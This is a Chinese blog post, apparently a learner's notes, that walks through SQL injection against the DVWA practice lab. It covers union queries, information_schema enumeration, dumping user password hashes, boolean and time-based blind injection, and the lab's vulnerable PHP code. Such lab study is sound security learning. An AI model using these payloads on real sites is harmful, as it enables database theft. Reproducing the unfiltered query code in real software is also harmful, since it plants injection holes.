@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>渗透学习记录OS | 山城冰荔枝</title>
+  <meta name="description" content="mysql默认表相关知识在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 infomation_schema 里面 这个库里面有很多表 重点是这三个表 columns 、tables、SCHEMATA 表字段 CHEMA_NAME 记录着库的信息 columns 存储该用户创建的所有数据库的库名、标名和字段名。 union联合注入攻击原理 步骤一：联合两表 ​	1.union语句">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透学习记录OS">
+<meta property="og:url" content="https://sfyyh.github.io/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/index.html">
+<meta property="og:site_name" content="山城冰荔枝">
+<meta property="og:description" content="mysql默认表相关知识在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 infomation_schema 里面 这个库里面有很多表 重点是这三个表 columns 、tables、SCHEMATA 表字段 CHEMA_NAME 记录着库的信息 columns 存储该用户创建的所有数据库的库名、标名和字段名。 union联合注入攻击原理 步骤一：联合两表 ​	1.union语句">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232138976-1882168286.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232149753-1158385166.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232208426-323266936.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232216969-1395888437.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232228021-2082015114.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232302275-1126861267.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232253962-1018686498.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232408409-1564081412.jpg">
+<meta property="article:published_time" content="2022-12-25T14:58:29.000Z">
+<meta property="article:modified_time" content="2023-08-03T14:59:14.200Z">
+<meta property="article:author" content="山城冰荔枝">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232138976-1882168286.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://sfyyh.github.io/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="山城冰荔枝" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/SFYYH" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">山城冰荔枝</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Web Developer &amp; Designer</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> BeiJing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/SFYYH" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>跑起来会有风!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E5%AE%89/" rel="tag">网安</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/%E7%BD%91%E5%AE%89/" style="font-size: 13px;">网安</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">八月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/08/03/my-first-blog/" class="title">记一次对小区wifi渗透</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-08-03T13:43:26.000Z" itemprop="datePublished">2023-08-03</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/08/03/hello-world/" class="title">Hello World</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-08-03T12:15:09.569Z" itemprop="datePublished">2023-08-03</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/" class="title">渗透学习记录OS</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-12-25T14:58:29.000Z" itemprop="datePublished">2022-12-25</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-渗透学习记录OS" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      渗透学习记录OS
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/" class="article-date">
+	  <time datetime="2022-12-25T14:58:29.000Z" itemprop="datePublished">2022-12-25</time>
+	</a>
+</span>
+        
+        
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 3.3k(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 14(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h2 id="mysql默认表相关知识"><a href="#mysql默认表相关知识" class="headerlink" title="mysql默认表相关知识"></a>mysql默认表相关知识</h2><p>在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 <code>infomation_schema</code> 里面 这个库里面有很多表 重点是这三个表 <code>columns 、tables、SCHEMATA</code> 表字段 CHEMA_NAME 记录着库的信息</p>
+<p>columns 存储该用户创建的所有数据库的库名、标名和字段名。</p>
+<h2 id="union联合注入攻击原理"><a href="#union联合注入攻击原理" class="headerlink" title="union联合注入攻击原理"></a>union联合注入攻击原理</h2><blockquote>
+<p>步骤一：联合两表</p>
+<p>​	1.union语句要求字段数一样才可以执行，所以我们要先进行字段判断</p>
+<p>常见方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE user_id=1 order by 8</span><br></pre></td></tr></table></figure>
+
+<p>判断出字段数为8</p>
+<p>然后通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `users` WHERE user_id=1 union SELECT 1,2,3,4,5,6,7,8</span><br></pre></td></tr></table></figure>
+
+<p>进行联合查询</p>
+</blockquote>
+<p>联合查询后面的语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT 1,2,user()</span><br></pre></td></tr></table></figure>
+
+<p>select后面的数字可以替换成字段的名称或者函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 替换成mysql内置函数</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user(),md5(&#x27;a&#x27;),version()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 替换成mysql数据库里的字段</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users</span><br><span class="line">-- 也可以在语句后面加上limit限定显示的行数</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 1</span><br><span class="line"></span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 0,2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 如果不想要第一个表里的数据 可以把1换成-1 因为默认负数就表示不存在的</span><br><span class="line">SELECT * FROM guestbook WHERE `comment_id`=-1 union SELECT user_id,user,password from users limit 1</span><br></pre></td></tr></table></figure>
+
+<h2 id="union联合注入攻击分析"><a href="#union联合注入攻击分析" class="headerlink" title="union联合注入攻击分析"></a>union联合注入攻击分析</h2><h3 id="分析联合注入漏洞代码"><a href="#分析联合注入漏洞代码" class="headerlink" title="分析联合注入漏洞代码"></a>分析联合注入漏洞代码</h3><p>首先我们先分析构成联合注入攻击的sql注入代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="comment">#这里传入的参数没有进行过滤直接进入sql语句</span></span><br><span class="line">    <span class="comment">#从这里可以判断出id是字符串类型 所以在进行sql注入检测的时候要匹配字符</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="comment">//显示查询成功后的内容</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="判断是否存在联合注入"><a href="#判断是否存在联合注入" class="headerlink" title="判断是否存在联合注入"></a>判断是否存在联合注入</h3><p>​	我们先通过靶场查询id 如果在我们没进行源代码分析的基础上 我们首先需要进行数字和字符串判断 <code>1</code> 和<code>1‘</code> 判断出传入数据是字符串型 即存在注入漏洞</p>
+<p>​	输入 1’and ‘1’&#x3D;’1 页面返回用户信息 1’and ‘1’&#x3D;’2 页面返回不一样的信息。基本可以确定存在 SQL 注入漏洞.</p>
+<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p>​	使用语句<code>order by</code>确定当前表的字符数</p>
+<p>​	order by 1 如果页面返回正常 字段数不少于 1,order by 2 不少于 2，一直如此类推直到页面出错。正确的字段数是出错数字减少 1</p>
+<p>公式 order by n-1</p>
+<p>1’ order by 1–+ 正常</p>
+<p>1’ order by 2–+ 正常</p>
+<p>1’ order by 3–+ 出错</p>
+<p>正常页面 </p>
+<h3 id="联合查询注入获取敏感信息"><a href="#联合查询注入获取敏感信息" class="headerlink" title="联合查询注入获取敏感信息"></a>联合查询注入获取敏感信息</h3><p>​	跟前面咱们分析的一样，这里只是把查询的数据替换成了联合查询的语句 然后进行获取另一个表的字段或者函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select user,password from users-- </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232138976-1882168286.png"></p>
+<p>我们也可以使用<code>group_concat（）</code>函数来进行分组打印</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(user(),0x3A,version())-- </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232149753-1158385166.png"></p>
+<h3 id="联合查询注入通过information-schema"><a href="#联合查询注入通过information-schema" class="headerlink" title="联合查询注入通过information_schema"></a>联合查询注入通过information_schema</h3><p>​	</p>
+<p>在黑盒情况下我们是不知道当前数据库里都有哪些表的所以我们先从mysql的information_schema入手进行表的查询</p>
+<p>第一个表：</p>
+<p>这里的<code>database（）</code>函数是来限定查询的表是当前表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)-- </span><br></pre></td></tr></table></figure>
+
+<p>第二个表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2)-- </span><br></pre></td></tr></table></figure>
+
+<p>通过两个表的查询我们知道dvwa中含有的表为<code>guestbook</code> 和<code>users</code></p>
+<h3 id="联合查询注入通过information-schema获取字段"><a href="#联合查询注入通过information-schema获取字段" class="headerlink" title="联合查询注入通过information_schema获取字段"></a>联合查询注入通过information_schema获取字段</h3><p>我们知道数据库的字段都存在mysql默认内置库information_schema的columns里，所以我们想要获取当前数据库的字段名字我们可以通过</p>
+<p>获取users表里的第一个字段名字 id </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1)-- </span><br><span class="line">-- 注意这里一定要加上限定 因为你每次查询都是一个字段如果不加会报错</span><br><span class="line">-- Subquery returns more than 1 row</span><br></pre></td></tr></table></figure>
+
+<p>获取第二个字段名字 password </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 2,1)-- </span><br></pre></td></tr></table></figure>
+
+<p>获取第三个字段名字  email</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 3,1)-- </span><br></pre></td></tr></table></figure>
+
+<p>获取第四个字段名字 secret</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 4,1)-- </span><br></pre></td></tr></table></figure>
+
+<p>………………………….</p>
+<h3 id="通过联合查询表里面的内容"><a href="#通过联合查询表里面的内容" class="headerlink" title="通过联合查询表里面的内容"></a>通过联合查询表里面的内容</h3><p>​	通过以上操作我们已经获取了当前数据库的库名、表名、字段</p>
+<p>那么我们就可以通过下面语句获取表里面的内容了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select group_concat(user,0x3a,password) from users limit 1)-- </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="boolean布尔型盲注入"><a href="#boolean布尔型盲注入" class="headerlink" title="boolean布尔型盲注入"></a>boolean布尔型盲注入</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="comment">#id为字符串型 get接收id参数</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$getid</span> ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = @<span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接收 id 的值，直接带入查询，如果存在即返回 users is exists in the database</p>
+<p>否则显示 users id is missing 像这种只有正确与错误页面。页面不会显示数据库</p>
+<p>里任何内容，如果存在注入，成为盲注入。</p>
+<p>​	盲注入的方法有两种：一是布尔型盲注入，二是延时注入</p>
+<h3 id="判断盲注入"><a href="#判断盲注入" class="headerlink" title="判断盲注入"></a>判断盲注入</h3><p>​	我们可以通过<code>1&#39; and &#39;1&#39;=&#39;1</code> 和 <code>1&#39; and &#39;1&#39;=&#39;2</code> 是否一样 </p>
+<p>​	以及 <code>1&#39; and sleep(10)--</code>让他睡10s判断是否一样 </p>
+<h3 id="Boolean布尔型注入攻击"><a href="#Boolean布尔型注入攻击" class="headerlink" title="Boolean布尔型注入攻击"></a>Boolean布尔型注入攻击</h3><p>​	因为页面不会返回查询的内容所以我们不能使用联合查询注入攻击，但是我们可以通过构造sql来获取数据。</p>
+<p>​	</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(1=1,1,0)--  -- 三目运算</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="布尔型盲注入获取数据库敏感信息"><a href="#布尔型盲注入获取数据库敏感信息" class="headerlink" title="布尔型盲注入获取数据库敏感信息"></a>布尔型盲注入获取数据库敏感信息</h3><p>​	在黑盒测试环境下，通过构造sql语句来进行获取敏感信息。</p>
+<p>构造sql语句常用的函数：</p>
+<p>1.<code>SUBSTRING()</code>字符串截取函数，第一个参数是字符串，第二个参数开始截取，第三个参数是截取的长度</p>
+<p>我们可以构造这样的sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT if(SUBSTRING(database(),1,1)=&#x27;d&#x27;,1,0)</span><br></pre></td></tr></table></figure>
+
+<p>如果截取的第一个字符是‘d’我们返回1 否则返回0</p>
+<p>此类推。再后拼接字符就是完整的库名。</p>
